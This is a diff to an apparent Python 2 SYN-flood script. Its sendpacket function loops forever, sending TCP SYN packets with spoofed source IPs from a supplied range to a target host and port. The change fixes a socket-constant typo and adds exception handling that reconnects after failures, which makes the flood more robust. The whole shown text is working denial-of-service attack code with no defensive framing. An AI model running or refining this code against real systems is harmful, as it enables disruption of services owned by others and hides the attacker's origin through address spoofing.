@@ -13,16 +13,18 @@ def sendpacket(Ip_range, destination, targetport):
                  silva.send(bytes(IP(dst = str(destination), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
                  print 'Package sent' 
              except:
-                 silva.shutdown(socket.SHUT_RDWR)
                  silva.close()
-                 silva = socket.socket(socket.AF_INet, socket.SOCK_STREAM)
+                 silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  silva.connect((destination, targetport))
         
     else: 
        while 0 == 0:
-           sourceIP = random.choice(Ip_range)
-           print 'Selected'
-           silva.send(bytes(IP(dst = str(destination), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
-           Ip_range.remove(sourceIP)
-           print 'package sent'
-                        
+           try:
+               sourceIP = random.choice(Ip_range)
+               silva.send(bytes(IP(dst = str(destination), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
+               Ip_range.remove(sourceIP)
+               print 'package sent'
+           except:         
+               silva.close()
+               silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+               silva.connect((destination, targetport))
